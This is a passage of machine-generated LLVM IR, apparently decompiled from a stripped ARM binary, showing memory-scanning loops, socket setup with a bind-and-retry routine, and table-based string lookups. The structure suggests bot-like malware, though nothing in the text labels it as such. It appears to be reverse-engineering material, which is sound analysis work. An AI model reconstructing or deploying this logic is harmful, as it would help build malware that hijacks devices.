dec_label_pc_d3d8:                                ; preds = %dec_label_pc_d3c4
  %v0_d3d8 = call i32 @function_1099c()
  %v1_d3dc = load i32, i32* @r7, align 4
  %v9_d3dc = icmp eq i32 %v0_d3d8, %v1_d3dc
  br i1 %v9_d3dc, label %dec_label_pc_d3fc, label %dec_label_pc_d3e4

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3d8
  %v2_d3ec = load i32, i32* @global_var_20a50.65, align 4
  store i32 %v2_d3ec, i32* %r1.global-to-local, align 4
  %v3_d3f0 = call i32 @function_106f8(i8* %v2_d0fc, i32 %v2_d3ec)
  %v2_d3f4 = icmp eq i32 %v3_d3f0, 0
  br i1 %v2_d3f4, label %dec_label_pc_d408, label %dec_label_pc_d3e4.dec_label_pc_d3fc_crit_edge

dec_label_pc_d3e4.dec_label_pc_d3fc_crit_edge:    ; preds = %dec_label_pc_d3e4
  %v0_d400.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d3fc

dec_label_pc_d3fc:                                ; preds = %dec_label_pc_d3e4.dec_label_pc_d3fc_crit_edge, %dec_label_pc_d3d8, %dec_label_pc_d3c4
  %v0_d400 = phi i32 [ %v0_d400.pre, %dec_label_pc_d3e4.dec_label_pc_d3fc_crit_edge ], [ %v0_d3d8, %dec_label_pc_d3d8 ], [ %v0_d3cc, %dec_label_pc_d3c4 ]
  store i32 %v2_d28c, i32* @r4, align 4
  store i32 %v0_d400, i32* @r5, align 4
  br label %dec_label_pc_d1dc.backedge

dec_label_pc_d1dc.backedge:                       ; preds = %dec_label_pc_d240, %dec_label_pc_d238, %dec_label_pc_d1ec, %dec_label_pc_d3fc, %dec_label_pc_d5d4, %.thread10
  %stack_var_-8412.1.be = phi i32 [ %v1_d210, %dec_label_pc_d5d4 ], [ %v1_d210, %dec_label_pc_d3fc ], [ %v1_d210, %.thread10 ], [ %stack_var_-8412.2, %dec_label_pc_d1ec ], [ %v1_d210, %dec_label_pc_d238 ], [ %v1_d210, %dec_label_pc_d240 ]
  %v0_d1dc = load i32, i32* @sb, align 4
  %v1_d1e0 = inttoptr i32 %v0_d1dc to i32*
  %v2_d1e0 = call i32 @function_11118(i32* %v1_d1e0)
  %v2_d1e4 = icmp eq i32 %v2_d1e0, 0
  br i1 %v2_d1e4, label %dec_label_pc_d27c, label %dec_label_pc_d1ec.preheader

dec_label_pc_d408:                                ; preds = %dec_label_pc_d3e4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d410 = call i32 @function_109e4(i32 %v1_d0ec, i32 0)
  %v7_d414 = icmp eq i32 %v2_d410, -1
  store i32 %v2_d410, i32* @r4, align 4
  br i1 %v7_d414, label %bb161, label %.thread12

bb161:                                            ; preds = %dec_label_pc_d408
  store i32 9, i32* %r1.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d408, %bb161
  store i32 54312, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d414, i32 ptrtoint (i32* @global_var_10ba4.67 to i32))
  %v0_d428 = load i32, i32* @r4, align 4
  %v1_d42c = call i32 @function_10dd8(i32 %v0_d428)
  br label %dec_label_pc_d430

dec_label_pc_d430:                                ; preds = %dec_label_pc_d288, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d43c = call i32 @function_109e4(i32 %v2_d2b8, i32 0)
  %v7_d440 = icmp eq i32 %v2_d43c, -1
  store i32 %v2_d43c, i32* @fp, align 4
  br i1 %v7_d440, label %dec_label_pc_d5d4, label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d430
  %v1_d450 = call i32 @function_fd60(i32 20)
  %v1_d458 = call i32 @function_fd60(i32 21)
  %v1_d460 = call i32 @function_fd60(i32 22)
  store i32 %v2_d468, i32* %r1.global-to-local, align 4
  %v3_d470 = call i32 @function_fc9c(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v2_d478, i32* %r1.global-to-local, align 4
  store i32 %v3_d470, i32* @r6, align 4
  %v3_d484 = call i32 @function_fc9c(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v3_d484, i32* @r8, align 4
  store i32 %v2_d490, i32* %r1.global-to-local, align 4
  %v3_d498 = call i32 @function_fc9c(i32 22, i32* nonnull %stack_var_-52)
  store i32 %v3_d498, i32* @sl, align 4
  store i32 %v2_d4a4, i32* @r4, align 4
  %v0_d4a876 = load i32, i32* @fp, align 4
  store i32 %v2_d4a4, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_d4b477 = call i32 @function_10b70(i32 %v0_d4a876)
  %tmp162 = icmp slt i32 %v1_d4b477, 1
  br i1 %tmp162, label %dec_label_pc_d608, label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d44c, %dec_label_pc_d4a8.backedge
  %v0_d51067 = phi i32 [ %v1_d4b4, %dec_label_pc_d4a8.backedge ], [ %v1_d4b477, %dec_label_pc_d44c ]
  store i32 %v2_cf4c, i32* %r1.global-to-local, align 4
  %v3_d4c4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d4c4, i32* @r5, align 4
  %v5_d4cc = icmp slt i32 %v0_d51067, %v3_d4c4
  br i1 %v5_d4cc, label %dec_label_pc_d4dc, label %dec_label_pc_d54c.lr.ph

dec_label_pc_d54c.lr.ph:                          ; preds = %dec_label_pc_d4c0
  %v1_d54450 = add i32 %v0_d51067, -1
  store i32 %v1_d54450, i32* %r1.global-to-local, align 4
  %v0_d54c.pre = load i32, i32* @r6, align 4
  %v1_d550.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d54c

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d544.backedge, %dec_label_pc_d4c0
  store i32 %v2_cf4c, i32* %r2.global-to-local, align 4
  %v3_d4e0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4e0, i32* @r5, align 4
  %v5_d4e8 = icmp slt i32 %v0_d51067, %v3_d4e0
  br i1 %v5_d4e8, label %dec_label_pc_d4f8, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_d4dc
  %v1_d57859 = add i32 %v0_d51067, -1
  store i32 %v1_d57859, i32* %r1.global-to-local, align 4
  %v2_d57860 = icmp eq i32 %v0_d51067, 0
  br i1 %v2_d57860, label %dec_label_pc_d4f8, label %dec_label_pc_d580.lr.ph

dec_label_pc_d580.lr.ph:                          ; preds = %.thread28
  %v0_d580.pre = load i32, i32* @r8, align 4
  %v1_d584.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d580

dec_label_pc_d4f8:                                ; preds = %dec_label_pc_d578.backedge, %.thread28, %dec_label_pc_d4dc
  store i32 %v2_cf4c, i32* %r3.global-to-local, align 4
  %v3_d4fc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d4fc, i32* @lr, align 4
  %v5_d504 = icmp slt i32 %v0_d51067, %v3_d4fc
  br i1 %v5_d504, label %dec_label_pc_d4a8.backedge, label %.thread34

dec_label_pc_d4a8.backedge:                       ; preds = %dec_label_pc_d52c, %.thread34, %dec_label_pc_d4f8
  %v0_d4a8 = load i32, i32* @fp, align 4
  store i32 %v2_d4a4, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_d4b4 = call i32 @function_10b70(i32 %v0_d4a8)
  %tmp163 = icmp slt i32 %v1_d4b4, 1
  br i1 %tmp163, label %dec_label_pc_d608, label %dec_label_pc_d4c0

.thread34:                                        ; preds = %dec_label_pc_d4f8
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d51069 = icmp eq i32 %v0_d51067, 0
  br i1 %v2_d51069, label %dec_label_pc_d4a8.backedge, label %dec_label_pc_d518.lr.ph

dec_label_pc_d518.lr.ph:                          ; preds = %.thread34
  %v0_d518.pre = load i32, i32* @sl, align 4
  %v1_d51c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d518

dec_label_pc_d518:                                ; preds = %dec_label_pc_d52c, %dec_label_pc_d518.lr.ph
  %v0_d510.in = phi i32 [ %v0_d51067, %dec_label_pc_d518.lr.ph ], [ %v0_d510, %dec_label_pc_d52c ]
  %v0_d52c = phi i32 [ 0, %dec_label_pc_d518.lr.ph ], [ %v1_d52c, %dec_label_pc_d52c ]
  %v1_d518 = phi i32 [ 0, %dec_label_pc_d518.lr.ph ], [ %v1_d518116, %dec_label_pc_d52c ]
  %v0_d510 = add i32 %v0_d510.in, -1
  %v2_d518 = add i32 %v1_d518, %v0_d518.pre
  %v3_d518 = inttoptr i32 %v2_d518 to i8*
  %v4_d518 = load i8, i8* %v3_d518, align 1
  %v6_d518 = zext i8 %v4_d518 to i32
  store i32 %v6_d518, i32* %r2.global-to-local, align 4
  %v2_d51c = add i32 %v0_d52c, %v1_d51c.pre
  %v3_d51c = inttoptr i32 %v2_d51c to i8*
  %v4_d51c = load i8, i8* %v3_d51c, align 1
  %v6_d51c = zext i8 %v4_d51c to i32
  store i32 %v6_d51c, i32* %r3.global-to-local, align 4
  %v9_d520 = icmp eq i8 %v4_d51c, %v4_d518
  br i1 %v9_d520, label %dec_label_pc_d59c, label %bb164

bb164:                                            ; preds = %dec_label_pc_d518
  br label %dec_label_pc_d52c

dec_label_pc_d52c:                                ; preds = %bb164, %dec_label_pc_d59c
  %v1_d518116 = phi i32 [ %v1_d59c, %dec_label_pc_d59c ], [ 0, %bb164 ]
  %v1_d52c = add i32 %v0_d52c, 1
  store i32 %v1_d52c, i32* %r1.global-to-local, align 4
  %v2_d510 = icmp eq i32 %v0_d510, 0
  br i1 %v2_d510, label %dec_label_pc_d4a8.backedge, label %dec_label_pc_d518

dec_label_pc_d534:                                ; preds = %dec_label_pc_d54c
  %v1_d534 = add i32 %v1_d54c, 1
  store i32 %v1_d534, i32* @lr, align 4
  %v9_d538 = icmp eq i32 %v3_d4c4, %v1_d534
  br i1 %v9_d538, label %dec_label_pc_d5a8, label %dec_label_pc_d544.backedge

dec_label_pc_d544.backedge:                       ; preds = %dec_label_pc_d534, %dec_label_pc_d560
  %v1_d54c98 = phi i32 [ 0, %dec_label_pc_d560 ], [ %v1_d534, %dec_label_pc_d534 ]
  %storemerge86 = add i32 %storemerge86.in, 1
  %v1_d544 = add i32 %v0_d544, -1
  store i32 %v1_d544, i32* %r1.global-to-local, align 4
  %v2_d544 = icmp eq i32 %v0_d544, 0
  br i1 %v2_d544, label %dec_label_pc_d4dc, label %dec_label_pc_d54c

dec_label_pc_d54c:                                ; preds = %dec_label_pc_d544.backedge, %dec_label_pc_d54c.lr.ph
  %v0_d544 = phi i32 [ %v1_d54450, %dec_label_pc_d54c.lr.ph ], [ %v1_d544, %dec_label_pc_d544.backedge ]
  %storemerge86.in = phi i32 [ 0, %dec_label_pc_d54c.lr.ph ], [ %storemerge86, %dec_label_pc_d544.backedge ]
  %v1_d54c = phi i32 [ 0, %dec_label_pc_d54c.lr.ph ], [ %v1_d54c98, %dec_label_pc_d544.backedge ]
  %v2_d54c = add i32 %v1_d54c, %v0_d54c.pre
  %v3_d54c = inttoptr i32 %v2_d54c to i8*
  %v4_d54c = load i8, i8* %v3_d54c, align 1
  %v6_d54c = zext i8 %v4_d54c to i32
  store i32 %v6_d54c, i32* %r2.global-to-local, align 4
  %v2_d550 = add i32 %storemerge86.in, %v1_d550.pre
  %v3_d550 = inttoptr i32 %v2_d550 to i8*
  %v4_d550 = load i8, i8* %v3_d550, align 1
  %v6_d550 = zext i8 %v4_d550 to i32
  store i32 %v6_d550, i32* %r3.global-to-local, align 4
  %v9_d554 = icmp eq i8 %v4_d550, %v4_d54c
  br i1 %v9_d554, label %dec_label_pc_d534, label %dec_label_pc_d560

dec_label_pc_d560:                                ; preds = %dec_label_pc_d54c
  br label %dec_label_pc_d544.backedge

dec_label_pc_d568:                                ; preds = %dec_label_pc_d580
  %v1_d568 = add i32 %v1_d580, 1
  store i32 %v1_d568, i32* @lr, align 4
  %v9_d56c = icmp eq i32 %v3_d4e0, %v1_d568
  br i1 %v9_d56c, label %dec_label_pc_d5a8, label %dec_label_pc_d578.backedge

dec_label_pc_d578.backedge:                       ; preds = %dec_label_pc_d568, %dec_label_pc_d594
  %v1_d580107 = phi i32 [ 0, %dec_label_pc_d594 ], [ %v1_d568, %dec_label_pc_d568 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d578 = add i32 %v0_d578, -1
  store i32 %v1_d578, i32* %r1.global-to-local, align 4
  %v2_d578 = icmp eq i32 %v0_d578, 0
  br i1 %v2_d578, label %dec_label_pc_d4f8, label %dec_label_pc_d580

dec_label_pc_d580:                                ; preds = %dec_label_pc_d578.backedge, %dec_label_pc_d580.lr.ph
  %v0_d578 = phi i32 [ %v1_d57859, %dec_label_pc_d580.lr.ph ], [ %v1_d578, %dec_label_pc_d578.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d580.lr.ph ], [ %storemerge, %dec_label_pc_d578.backedge ]
  %v1_d580 = phi i32 [ 0, %dec_label_pc_d580.lr.ph ], [ %v1_d580107, %dec_label_pc_d578.backedge ]
  %v2_d580 = add i32 %v1_d580, %v0_d580.pre
  %v3_d580 = inttoptr i32 %v2_d580 to i8*
  %v4_d580 = load i8, i8* %v3_d580, align 1
  %v6_d580 = zext i8 %v4_d580 to i32
  store i32 %v6_d580, i32* %r2.global-to-local, align 4
  %v2_d584 = add i32 %storemerge.in, %v1_d584.pre
  %v3_d584 = inttoptr i32 %v2_d584 to i8*
  %v4_d584 = load i8, i8* %v3_d584, align 1
  %v6_d584 = zext i8 %v4_d584 to i32
  store i32 %v6_d584, i32* %r3.global-to-local, align 4
  %v9_d588 = icmp eq i8 %v4_d584, %v4_d580
  br i1 %v9_d588, label %dec_label_pc_d568, label %dec_label_pc_d594

dec_label_pc_d594:                                ; preds = %dec_label_pc_d580
  br label %dec_label_pc_d578.backedge

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d518
  %v1_d59c = add i32 %v1_d518, 1
  %v9_d5a0 = icmp eq i32 %v3_d4fc, %v1_d59c
  br i1 %v9_d5a0, label %dec_label_pc_d5a8, label %dec_label_pc_d52c

dec_label_pc_d5a8:                                ; preds = %dec_label_pc_d534, %dec_label_pc_d568, %dec_label_pc_d59c
  %v1_d5ac = call i32 @function_fcc0(i32 20)
  %v1_d5b4 = call i32 @function_fcc0(i32 21)
  %v1_d5bc = call i32 @function_fcc0(i32 22)
  %v0_d5c0 = load i32, i32* @fp, align 4
  %v1_d5c4 = call i32 @function_10dd8(i32 %v0_d5c0)
  %v0_d5c8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d5d0 = call i32 @function_10ba4(i32 %v0_d5c8, i32 9)
  br label %dec_label_pc_d5d4

dec_label_pc_d5d4:                                ; preds = %dec_label_pc_d430, %dec_label_pc_d608, %dec_label_pc_d5a8
  store i32 %v2_d2b8, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d5e0 = call i32 @function_103ac()
  store i32 %v2_d308, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d5f0 = call i32 @function_103ac()
  %v1_d5f8 = call i32 @function_12ef0(i32 1)
  store i32 %v2_d28c, i32* @r4, align 4
  %v0_d600 = load i32, i32* @r7, align 4
  store i32 %v0_d600, i32* @r5, align 4
  br label %dec_label_pc_d1dc.backedge

dec_label_pc_d608:                                ; preds = %dec_label_pc_d4a8.backedge, %dec_label_pc_d44c
  %v1_d60c = call i32 @function_fcc0(i32 20)
  %v1_d614 = call i32 @function_fcc0(i32 21)
  %v1_d61c = call i32 @function_fcc0(i32 22)
  %v0_d620 = load i32, i32* @fp, align 4
  %v1_d624 = call i32 @function_10dd8(i32 %v0_d620)
  br label %dec_label_pc_d5d4

; uselistorder directives
  uselistorder i32 %v1_d59c, { 1, 0 }
  uselistorder i32 %v1_d52c, { 1, 0 }
  uselistorder i32 %v1_d518, { 1, 0 }
  uselistorder i32 %v0_d52c, { 1, 0 }
  uselistorder i32 %v1_d4b4, { 1, 0 }
  uselistorder i32 %v2_d43c, { 1, 0 }
  uselistorder i1 %v7_d414, { 1, 0 }
  uselistorder i32 %v2_d410, { 1, 0 }
  uselistorder i32 %v2_d1e0, { 1, 0 }
  uselistorder i32 %stack_var_-8412.1.be, { 1, 0 }
  uselistorder i32 %v3_d368, { 1, 2, 0 }
  uselistorder i32 %v2_d270, { 1, 0 }
  uselistorder i32 %v1_d210, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d1ec, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8412.0, { 1, 0 }
  uselistorder i32 %v2_d4a4, { 1, 0, 2 }
  uselistorder i32 %v2_d308, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d2b8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_d184, { 1, 0 }
  uselistorder i32 %v2_d150, { 2, 0, 1 }
  uselistorder i32 %v1_d0ec, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d070, { 1, 2, 0 }
  uselistorder i32 %v3_d01c, { 1, 2, 0 }
  uselistorder i32 %v3_cfc8, { 1, 2, 0 }
  uselistorder i32 %v3_cf7c, { 1, 2, 0 }
  uselistorder i32 %storemerge126, { 1, 0 }
  uselistorder i32 %v0_cf10, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-68, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 7, 6, 0, 9, 3, 2, 8, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 (i32*)* @function_11118, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @function_10fd4, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10b3c, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_20a50.65, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_20a54.58, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d5d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d578.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d544.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d52c, { 1, 0 }
  uselistorder label %dec_label_pc_d4c0, { 1, 0 }
  uselistorder label %dec_label_pc_d430, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d3c4, { 1, 0 }
  uselistorder label %dec_label_pc_d1ec, { 1, 0 }
  uselistorder label %dec_label_pc_d1ec.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d09c, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
  uselistorder label %dec_label_pc_cfa8, { 1, 0 }
}

define i32 @function_d63c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d63c:
  store i32 ptrtoint (i32* @global_var_d7b4.69 to i32), i32* inttoptr (i32 124928 to i32*), align 2048
  ret i32 %arg1
}

define i32 @function_d654(i32 %arg1) local_unnamed_addr {
dec_label_pc_d654:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d654 = load i32, i32* @r6, align 4
  %v12_d654 = load i32, i32* @r7, align 4
  %v15_d654 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d670 = call i32 @function_115e4(i32 2, i32 1, i32 0)
  store i32 %v3_d670, i32* %r0.global-to-local, align 4
  store i32 124920, i32* @r6, align 4
  %v7_d678 = icmp eq i32 %v3_d670, -1
  store i32 %v3_d670, i32* inttoptr (i32 124920 to i32*), align 8
  br i1 %v7_d678, label %dec_label_pc_d654.dec_label_pc_d730_crit_edge, label %dec_label_pc_d684

dec_label_pc_d654.dec_label_pc_d730_crit_edge:    ; preds = %dec_label_pc_d654
  %v1_d738.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d730

dec_label_pc_d684:                                ; preds = %dec_label_pc_d654
  %v2_d684 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d684, i32* @r3, align 4
  %v0_d688 = load i32, i32* @r4, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  %v0_d698 = load i32, i32* %r0.global-to-local, align 4
  %v5_d698 = call i32 @function_115a0(i32 %v0_d698, i32 %v0_d688, i32 2, i32 %v2_d684, i32 4)
  store i32 %v5_d698, i32* %r0.global-to-local, align 4
  %v0_d69c = load i32, i32* @r6, align 4
  %v1_d69c = inttoptr i32 %v0_d69c to i32*
  %v2_d69c = load i32, i32* %v1_d69c, align 4
  store i32 %v2_d69c, i32* %r4.global-to-local, align 4
  store i32 %v2_d69c, i32* %r0.global-to-local, align 4
  %v2_d6ac = call i32 @function_10c0c(i32 %v2_d69c, i32 3)
  %v0_d6b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_d69c, i32* %r0.global-to-local, align 4
  %v2_d6bc = call i32 @function_10c0c(i32 %v2_d69c, i32 %v0_d6b0)
  store i32 %v2_d6bc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @1 to i32), i32* @r8, align 4
  %v0_d6ec = call i32 @function_11200()
  store i32 %v0_d6ec, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v2_d6f4 = inttoptr i32 %v0_d6ec to i32*
  store i32 0, i32* %v2_d6f4, align 4
  %v2_d6f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d6f8, i32* @r5, align 4
  store i32 %v0_d6ec, i32* %r4.global-to-local, align 4
  %v0_d708 = load i32, i32* @r6, align 4
  %v1_d708 = inttoptr i32 %v0_d708 to i32*
  %v2_d708 = load i32, i32* %v1_d708, align 4
  store i32 %v2_d708, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d714 = call i32 @function_11394(i32 %v2_d708, i32 %v2_d6f8, i32 16)
  store i32 %v3_d714, i32* %r0.global-to-local, align 4
  %v7_d718 = icmp eq i32 %v3_d714, -1
  br i1 %v7_d718, label %dec_label_pc_d73c, label %dec_label_pc_d720

dec_label_pc_d720:                                ; preds = %dec_label_pc_d684
  %v2_d728 = load i32, i32* inttoptr (i32 124920 to i32*), align 8
  store i32 %v2_d728, i32* %r0.global-to-local, align 4
  %v2_d72c = call i32 @function_11480(i32 %v2_d728, i32 1)
  store i32 %v2_d72c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d730

dec_label_pc_d730:                                ; preds = %dec_label_pc_d654.dec_label_pc_d730_crit_edge, %dec_label_pc_d748, %dec_label_pc_d720
  %v1_d738 = phi i32 [ %v1_d738.pre, %dec_label_pc_d654.dec_label_pc_d730_crit_edge ], [ %v1_d78c, %dec_label_pc_d748 ], [ %v2_d72c, %dec_label_pc_d720 ]
  store i32 %v9_d654, i32* @r6, align 4
  store i32 %v12_d654, i32* @r7, align 4
  store i32 %v15_d654, i32* @r8, align 4
  ret i32 %v1_d738

dec_label_pc_d73c:                                ; preds = %dec_label_pc_d684
  %v0_d73c = load i32, i32* %r4.global-to-local, align 4
  %v1_d73c = inttoptr i32 %v0_d73c to i32*
  %v2_d73c = load i32, i32* %v1_d73c, align 4
  %v7_d740 = icmp eq i32 %v2_d73c, 99
  br i1 %v7_d740, label %dec_label_pc_d794, label %dec_label_pc_d748

dec_label_pc_d748:                                ; preds = %dec_label_pc_d794, %bb, %dec_label_pc_d73c
  store i32 23815, i32* @r4, align 4
  %v0_d760 = load i32, i32* @r6, align 4
  %v1_d760 = inttoptr i32 %v0_d760 to i32*
  %v2_d760 = load i32, i32* %v1_d760, align 4
  store i32 %v2_d760, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d770 = call i32 @function_113cc(i32 %v2_d760, i32 %v2_d6f8, i32 16)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_d778 = call i32 @function_12ef0(i32 5)
  store i32 %v1_d778, i32* %r0.global-to-local, align 4
  %v0_d77c = load i32, i32* @r6, align 4
  %v1_d77c = inttoptr i32 %v0_d77c to i32*
  %v2_d77c = load i32, i32* %v1_d77c, align 4
  store i32 %v2_d77c, i32* %r0.global-to-local, align 4
  %v1_d780 = call i32 @function_10dd8(i32 %v2_d77c)
  %v0_d784 = load i32, i32* @r4, align 4
  store i32 %v0_d784, i32* %r0.global-to-local, align 4
  %v1_d788 = call i32 @function_c964(i32 %v0_d784)
  store i32 %v1_d788, i32* %r0.global-to-local, align 4
  %v1_d78c = call i32 @function_d654(i32 %v1_d788)
  store i32 %v1_d78c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d730

dec_label_pc_d794:                                ; preds = %dec_label_pc_d73c
  %v0_d794 = load i32, i32* @r8, align 4
  %v1_d794 = inttoptr i32 %v0_d794 to i8*
  %v2_d794 = load i8, i8* %v1_d794, align 1
  %v3_d794 = zext i8 %v2_d794 to i32
  %v1_d798 = load i32, i32* @r7, align 4
  %v9_d798 = icmp eq i32 %v3_d794, %v1_d798
  br i1 %v9_d798, label %dec_label_pc_d748, label %bb

bb:                                               ; preds = %dec_label_pc_d794
  %v2_d7a0 = trunc i32 %v1_d798 to i8
  store i8 %v2_d7a0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @1, i32 0, i32 0), align 1
  br label %dec_label_pc_d748

; uselistorder directives
  uselistorder i32 %v1_d78c, { 1, 0 }
  uselistorder i32 %v2_d6f8, { 1, 0, 2 }
  uselistorder i32 %v2_d69c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_d670, { 1, 0, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 0, 2, 1, 3, 5, 4, 7, 6, 9, 8, 10, 12, 11, 13, 14, 16, 17, 18, 15 }
  uselistorder i32 (i32)* @function_c964, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_11480, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_11394, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder [4 x i8]* @1, { 1, 0 }
  uselistorder label %dec_label_pc_d748, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d730, { 1, 2, 0 }
}

define i32 @function_d7a8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d7a8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_d7a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d7a8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_d7a8
  %v1_d7a8 = load i32, i32* @lr, align 4
  store i32 %v1_d7a8, i32* %arg1, align 4
  %v4_d7a8 = load i32, i32* @r8, align 4
  %v5_d7a8 = load i32, i32* %r1.global-to-local, align 4
  %v6_d7a8 = sub i32 %v5_d7a8, %v4_d7a8
  store i32 %v6_d7a8, i32* %r1.global-to-local, align 4
  %v2_d7b0 = load i32, i32* @ip, align 4
  %v5_d7b0 = sdiv i32 %v2_d7b0, 1048576
  %v6_d7b0 = and i32 %v5_d7b0, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_d7a8, %bb
  %.0 = phi i32 [ %v6_d7b0, %bb ], [ undef, %dec_label_pc_d7a8 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_d7b4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d7b4:
  %v1_d7bc = call i32 @function_fd60(i32 1)
  store i32 ptrtoint ([15 x i8]* @global_var_16170.75 to i32), i32* @r0, align 4
  %v2_d7c4 = call i32 @function_11334(i32 ptrtoint ([15 x i8]* @global_var_16170.75 to i32))
  store i32 ptrtoint (i16** @global_var_20a58.77 to i32), i32* @r4, align 4
  store i32 %v2_d7c4, i32* @global_var_20a5c.78, align 4
  %v3_d7d8 = call i32 @function_fc9c(i32 1, i32* null)
  %v4_d7d8 = inttoptr i32 %v3_d7d8 to i16*
  %v3_d7dc = load i16, i16* %v4_d7d8, align 2
  store i16 %v3_d7dc, i16* bitcast (i32* @global_var_20a5a.79 to i16*), align 4
  %v1_d7e8 = call i32 @function_fcc0(i32 1)
  ret i32 %v1_d7e8
}

define i32 @function_d7fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_d7fc:
  %stack_var_-20 = alloca i32, align 4
  %v3_d7fc = load i32, i32* @r4, align 4
  %v6_d7fc = load i32, i32* @r5, align 4
  %v9_d7fc = load i32, i32* @lr, align 4
